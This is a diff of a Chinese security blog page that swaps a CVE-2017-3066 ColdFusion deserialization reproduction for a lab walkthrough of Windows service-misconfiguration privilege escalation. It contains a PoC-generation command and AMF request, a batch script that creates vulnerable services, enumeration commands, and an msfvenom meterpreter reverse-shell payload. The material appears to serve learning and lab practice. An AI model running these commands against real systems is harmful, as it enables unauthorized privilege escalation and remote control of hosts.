@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
-  <title>Reproduction of CVE-2017-3066 | 9most的博客</title>
+  <title>windows配置错误导致的提权 | 9most的博客</title>
   <meta name="keywords" content=" Writing ">
-  <meta name="description" content="Reproduction of CVE-2017-3066 | 9most的博客">
+  <meta name="description" content="windows配置错误导致的提权 | 9most的博客">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="Become a hacker">
 <meta property="og:type" content="website">
@@ -969,9 +969,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-Reproduction-of-CVE-2017-3066" class="article article-type-post" itemscope="" itemprop="blogPost">
+        <article id="post-windows配置错误导致的提权" class="article article-type-post" itemscope="" itemprop="blogPost">
     
-        <h1 class="article-title">Reproduction of CVE-2017-3066</h1>
+        <h1 class="article-title">windows配置错误导致的提权</h1>
     
     <div class="article-meta">
         
@@ -987,7 +987,7 @@
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title="更新时间: 2019-04-19 20:36:16">2019-02-01 14:14</time>
+        创建时间:<time class="date" title="更新时间: 2019-08-26 16:38:30">2019-08-26 14:36</time>
         
     </div>
     <div class="article-meta">
@@ -1009,7 +1009,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞介绍"><span class="toc-text">漏洞介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#正文"><span class="toc-text">正文</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#配置环境"><span class="toc-text">配置环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#常见的四种错误"><span class="toc-text">常见的四种错误</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#不带引号的服务路径"><span class="toc-text">不带引号的服务路径</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#注册表权限不足"><span class="toc-text">注册表权限不足</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#补充"><span class="toc-text">补充</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结"><span class="toc-text">总结</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -1024,21 +1024,57 @@
 </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>继续复现CVE漏洞<br><img src="http://5b0988e595225.cdn.sohucs.com/images/20180510/5c5977424262470b91df6257318adc2e.jpeg" alt="5c5977424262470b91df6257318adc2e.jpeg"></p>
-<h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>Adobe ColdFusion是美国Adobe公司的一款动态Web服务器产品，其运行的CFML（ColdFusion Markup Language）是针对Web应用的一种程序设计语言。</p>
-<p>Adobe ColdFusion中存在java反序列化漏洞。攻击者可利用该漏洞在受影响应用程序的上下文中执行任意代码或造成拒绝服务。以下版本受到影响：Adobe ColdFusion (2016 release) Update 3及之前的版本，ColdFusion 11 Update 11及之前的版本，ColdFusion 10 Update 22及之前的版本。</p>
-<p>参考链接：</p>
-<p><a href="https://codewhitesec.blogspot.com.au/2018/03/exploiting-adobe-coldfusion.html" target="_blank" rel="noopener">https://codewhitesec.blogspot.com.au/2018/03/exploiting-adobe-coldfusion.html</a></p>
-<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>启动漏洞环境<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker-compose up -d</span><br></pre></td></tr></table></figure></p>
-<p>等待环境搭建完成后，访问<a href="http://127.0.0.1:8500/CFIDE/administrator/index.cfm，输入密码vulhub，即可成功安装Adobe" target="_blank" rel="noopener">http://127.0.0.1:8500/CFIDE/administrator/index.cfm，输入密码vulhub，即可成功安装Adobe</a> ColdFusion。</p>
-<p><img src="https://s2.ax1x.com/2019/02/01/k3aUIS.md.png" alt="k3aUIS.md.png"></p>
-<p><img src="https://s2.ax1x.com/2019/02/01/k3adPg.png" alt="k3adPg.png"></p>
-<p><img src="https://s2.ax1x.com/2019/02/01/k3a02j.md.png" alt="k3a02j.md.png"></p>
-<p>我们使用参考链接中的<a href="https://github.com/codewhitesec/ColdFusionPwn" target="_blank" rel="noopener">GitHub - codewhitesec/ColdFusionPwn: Exploitation Tool for CVE-2017-3066 targeting Adobe Coldfusion 11/12</a>工具来生成POC：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ColdFusionPwn-0.0.1-SNAPSHOT-all.jar:ysoserial-0.0.6-SNAPSHOT-all.jar com.codewhitesec.coldfusionpwn.ColdFusionPwner -e CommonsBeanutils1 &apos;touch /tmp/success&apos; poc.ser</span><br></pre></td></tr></table></figure></p>
-<p>POC生成于poc.ser文件中，将POC作为数据包body发送给<a href="http://127.0.0.1:8500/flex2gateway/amf，Content-Type为application/x-amf：" target="_blank" rel="noopener">http://127.0.0.1:8500/flex2gateway/amf，Content-Type为application/x-amf：</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST /flex2gateway/amf HTTP/1.1</span><br><span class="line">Host: 127.0.0.1.:8500</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-amf</span><br><span class="line">Content-Length: 2853</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://s2.ax1x.com/2019/02/01/k3aWiF.png" alt="k3aWiF.png"></p>
-<p><img src="https://s2.ax1x.com/2019/02/01/k3aIMR.png" alt="k3aIMR.png"></p>
-<p>进入容器中，发现/tmp/success已成功创建：<br><img src="https://s2.ax1x.com/2019/02/01/k3abdK.png" alt="k3abdK.png"><br>改成反弹shell的命令即可获取shell<br>转载请声明：转自422926799.github.io</p>
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>由于管理员或用户对某些服务或权限设置错误，导致提权</p>
+<p><img src="https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1566811889993&amp;di=a7f8f8a7e0740867fcc2d63a33d95888&amp;imgtype=0&amp;src=http%3A%2F%2Fb-ssl.duitang.com%2Fuploads%2Fitem%2F201502%2F06%2F20150206172439_5PiSf.jpeg" alt=""></p>
+<h2 id="配置环境"><a href="#配置环境" class="headerlink" title="配置环境"></a>配置环境</h2><p>参考文章：<a href="https://amonsec.net/2018/09/23/Common-Windows-Misconfiguration-Services.html" target="_blank" rel="noopener">https://amonsec.net/2018/09/23/Common-Windows-Misconfiguration-Services.html</a></p>
+<p>首先先搭建对应的环境：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">windows 10</span><br></pre></td></tr></table></figure>
+<p>将以下保存为bat并以管理员权限执行</p>
+<figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> [*] Create user lowuser</span><br><span class="line"><span class="built_in">net</span> user lowuser lowuser1234 /add</span><br><span class="line"><span class="built_in">echo</span> [*] Create directories <span class="keyword">for</span> the binaryPath of our services</span><br><span class="line"><span class="built_in">mkdir</span> "C:\WeakServices\Weak Service <span class="number">1</span>"</span><br><span class="line"><span class="built_in">mkdir</span> "C:\WeakServices\WeakService2"</span><br><span class="line"><span class="built_in">mkdir</span> "C:\WeakServices\WeakService3"</span><br><span class="line"><span class="built_in">mkdir</span> "C:\WeakServices\WeakService4"</span><br><span class="line"><span class="built_in">echo</span> [*] Use a default binary</span><br><span class="line"><span class="built_in">copy</span> C:\Windows\System32\snmptrap.exe "C:\WeakServices\Weak Service <span class="number">1</span>\service1.exe"</span><br><span class="line"><span class="built_in">copy</span> C:\Windows\System32\snmptrap.exe "C:\WeakServices\WeakService2\service2.exe"</span><br><span class="line"><span class="built_in">copy</span> C:\Windows\System32\snmptrap.exe "C:\WeakServices\WeakService3\service3.exe"</span><br><span class="line"><span class="built_in">copy</span> C:\Windows\System32\snmptrap.exe "C:\WeakServices\WeakService4\service4.exe"</span><br><span class="line"><span class="built_in">echo</span> [*] settings 权</span><br><span class="line">icacls "C:\WeakServices\Weak Service <span class="number">1</span>" /deny lowuser:M</span><br><span class="line">icacls "C:\WeakServices\WeakService3" /deny lowuser:M</span><br><span class="line">icacls "C:\WeakServices\WeakService4" /deny lowuser:M</span><br><span class="line"><span class="built_in">echo</span> [*] 四服务</span><br><span class="line">sc create WeakService1 displayName= "Unquoted Service <span class="built_in">Path</span>" binPath= "C:\WeakServices\Weak Service <span class="number">1</span>\service1.exe" <span class="built_in">start</span>= auto</span><br><span class="line">sc create WeakService2 displayName= "Weak Folder Permissions" binPath= "C:\WeakServices\WeakService2\service2.exe" <span class="built_in">start</span>= auto</span><br><span class="line">sc create WeakService3 displayName= "Weak Service Permissions" binPath= "C:\WeakServices\WeakService3\service3.exe" obj= .\lowuser password= lowuser1234 <span class="built_in">start</span>= auto</span><br><span class="line">sc create WeakService4 displayName= "Weak Registry Permissions" binPath= "C:\WeakServices\WeakService4\service4.exe" <span class="built_in">start</span>= demand</span><br><span class="line"><span class="built_in">echo</span> [*] Modifying WeakService3's permissions</span><br><span class="line">sc sdset WeakService3 "D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)S:(AU;FA;DCLCSWRPWPDTLOCRSDRCWDWO;;;WD)"</span><br></pre></td></tr></table></figure>
+<p>创建完成后会有一个lowsuer用户，以及对应的服务</p>
+<p><img src="https://s2.ax1x.com/2019/08/26/mWfGnJ.png" alt="éç½®ç¯å¢"></p>
+<p>创建完成</p>
+<p><img src="https://s2.ax1x.com/2019/08/26/mWfw9K.png" alt="éç½®å®æ"></p>
+<h2 id="常见的四种错误"><a href="#常见的四种错误" class="headerlink" title="常见的四种错误"></a>常见的四种错误</h2><ul>
+<li>不带引号的服务路径</li>
+<li>弱文件夹权限</li>
+<li>弱服务权限</li>
+<li>注册表权限不足</li>
+</ul>
+<p>利用的要求是：服务是系统启动时自启动的,服务的权限为高权用户</p>
+<p>推荐利用手法：生成一个执行创建Administrator用户的exe，推测应该执行服务就断了所以反弹meterpreter那些不可取，下面会说到</p>
+<h2 id="不带引号的服务路径"><a href="#不带引号的服务路径" class="headerlink" title="不带引号的服务路径"></a>不带引号的服务路径</h2><p>执行wmic命令来过滤出不带引号的服务路径</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic service get name,displayname,startmode,pathname | <span class="built_in">findstr</span> /i /v "C:\Windows\\" |<span class="built_in">findstr</span> /i /v """</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.ax1x.com/2019/08/26/mWhNrQ.png" alt="ä¸å¸¦å¼å·çæå¡è·¯å¾"></p>
+<p>使用sc查看对应的服务</p>
+<p>PS:AUTO_START是系统启动将自启动该服务的意思</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc qc [servicename]</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.ax1x.com/2019/08/26/mWhtKg.png" alt="æå¡è·¯å¾"></p>
+<p>查看BINARY_PATH_NAME第一个父文件夹的权限</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">icacls [path]</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.ax1x.com/2019/08/26/mWhjII.png" alt="æä»¶å¤¹æé"></p>
+<p>可以从图中得到如下信息：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">所有者:NT AUTHORITY\SYSTEM</span><br><span class="line">可操作的用户组:NT AUTHORITY\Authenticated Users (所有用户的意思)</span><br></pre></td></tr></table></figure>
+<p>根据文章中说的带引号的文件寻找方法和不带引号的文件寻找方法：</p>
+<p><img src="https://s2.ax1x.com/2019/08/26/mW4KQU.png" alt="image"></p>
+<p>然后使用msfvenom创建一个exe，改名为Weak.exe放入<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
+<p>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=xxx LPORT=xxx -f exe &gt; Weak.exe<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">这里可能就有人问了，如果文件名没空格呢？比如```C:lbw\Fuckyou\nm.exe```那么就在lbw文件夹下创建</span><br><span class="line"></span><br><span class="line">一个名为Fuckyou.exe，然后把Fuckyou文件夹给改名</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">由于低权用户无法重启服务，但是可以通过重启系统来让服务重新执行。重启之后将执行```C:WeakServices\Weak.exe```,为什么呢？因为在寻找二进制过程中，当发现由exe结尾的就会认为是对应服务的二进制文件，导致滥用</span><br><span class="line"></span><br><span class="line">重启windows</span><br><span class="line"></span><br><span class="line">![éå¯](https://s2.ax1x.com/2019/08/26/mW5R41.md.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">在登录界面短暂的获取到meterpreter，我不清楚这里是windows10的问题还是什么原因，过了一段时间就会掉了</span><br><span class="line"></span><br><span class="line">![åå¼¹meterpreter](https://s2.ax1x.com/2019/08/26/mW5UNn.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">不知道什么原因？</span><br><span class="line"></span><br><span class="line">![ä¸ç¥éä»ä¹åå ](https://s2.ax1x.com/2019/08/26/mW5j8P.png)</span><br><span class="line"></span><br><span class="line">这是GIF示例</span><br><span class="line"></span><br><span class="line">![GIF](https://s2.ax1x.com/2019/08/26/mWovnS.gif)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">system权限图</span><br><span class="line"></span><br><span class="line">![image](https://s2.ax1x.com/2019/08/26/mWqsRs.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## 弱文件夹权限 #</span><br><span class="line"></span><br><span class="line">这里用WeaKService2做示例</span><br><span class="line"></span><br><span class="line">![image](https://s2.ax1x.com/2019/08/26/mWoQOS.png)</span><br><span class="line"></span><br><span class="line">第一步寻找允许任意用户修改的服务，并且权限是高权用户所执行的（补充有说明）</span><br><span class="line"></span><br><span class="line">![image](https://s2.ax1x.com/2019/08/26/mWTL59.png)</span><br><span class="line"></span><br><span class="line">得到所有用户都可以访问的结果后，生成一个exe将其改名为服务启动的exe替换。并长重启系统，这里用calc做例子</span><br><span class="line"></span><br><span class="line">![image](https://s2.ax1x.com/2019/08/26/mW7fde.png)</span><br><span class="line"></span><br><span class="line">或者你直接把存放服务指定二进制的文件夹给改名了，自己在创建服务指定的二进制文件的文件夹。这里就是新建一个WeakServices2文件夹</span><br><span class="line"></span><br><span class="line">![image](https://s2.ax1x.com/2019/08/26/mWLuSs.png)</span><br><span class="line"></span><br><span class="line">重启GIF</span><br><span class="line"></span><br><span class="line">![GIF](https://s2.ax1x.com/2019/08/26/mWLI78.gif)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## 弱服务权限 ##</span><br><span class="line"></span><br><span class="line">用WeakService3来做示例</span><br><span class="line"></span><br><span class="line">![1566806147207](C:\Users\jiushi\AppData\Roaming\Typora\typora-user-images\1566806147207.png)</span><br><span class="line"></span><br><span class="line">这里要用到一个工具来查看服务的权限，accesschk，下载地址：[accesschk](https://docs.microsoft.com/zh-cn/sysinternals/downloads/accesschk)</span><br><span class="line"></span><br><span class="line">执行```accesschk -cv [service name]</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://s2.ax1x.com/2019/08/26/mWx8JS.png" alt="image"></p>
+<p>允许Everyone设置服务任何操作，那么通过修改服务的BINARY_PATH_NAME,并重启该服务即可提升权限。这里将BINARY_PATH_NAME设置为如下路径</p>
+<p><img src="https://s2.ax1x.com/2019/08/26/mWzR1g.png" alt="image"></p>
+<p>动态GIF</p>
+<p><img src="https://s2.ax1x.com/2019/08/26/mfS1gg.gif" alt="GIF"></p>
+<h2 id="注册表权限不足"><a href="#注册表权限不足" class="headerlink" title="注册表权限不足"></a>注册表权限不足</h2><p>错误配置的服务注册表项，注册表路径<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">存放着对应的服务设置</span><br><span class="line"></span><br><span class="line">![image](https://s2.ax1x.com/2019/08/26/mfp8JK.md.png)</span><br><span class="line"></span><br><span class="line">使用accesschk检查注册表的权限</span><br><span class="line"></span><br><span class="line">执行```accesschk -kvw [regedit path]</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://s2.ax1x.com/2019/08/26/mfFyrD.png" alt="image"></p>
+<p>我这里查询不到，但是文章是可以查的到的。不过没关系，直接手动打开注册表对服务的ImagePath进行修改，如果修改成功的话就代表有权限。否则就没有</p>
+<p>修改前：</p>
+<p><img src="https://s2.ax1x.com/2019/08/26/mfF4RP.md.png" alt="image"></p>
+<p>（好吧，不是accesschk 的错，的确没有权限，那么这里就不弄了。可以自己看参考文章）</p>
+<p><img src="https://s2.ax1x.com/2019/08/26/mfFTsS.md.png" alt="image"></p>
+<h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>寻找弱文件夹权限和弱服务权限使用到的操作是使用：<code>accesschk64.exe -cv *</code></p>
+<p>获取所有服务，然后搜索关键字:<code>RW Everyone</code>，挑选高权的服务</p>
+<p><img src="https://s2.ax1x.com/2019/08/26/mfE9UJ.png" alt="image"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>当exp提权不下的时候，可以尝试寻找这些错误的配置。来提升自己的权限</p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
@@ -1048,12 +1084,12 @@
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>Reproduction of CVE-2017-3066</p>
+    <p><span class="copy-title">文章标题:</span>windows配置错误导致的提权</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="9most">9most</a></p>
-    <p><span class="copy-title">发布时间:</span>2019-02-01, 14:14:34</p>
-    <p><span class="copy-title">最后更新:</span>2019-04-19, 20:36:16</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/8129983d.html" title="Reproduction of CVE-2017-3066">http://422926799.github.io/posts/8129983d.html</a>
+    <p><span class="copy-title">发布时间:</span>2019-08-26, 14:36:36</p>
+    <p><span class="copy-title">最后更新:</span>2019-08-26, 16:38:30</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/34b370c6.html" title="windows配置错误导致的提权">http://422926799.github.io/posts/34b370c6.html</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
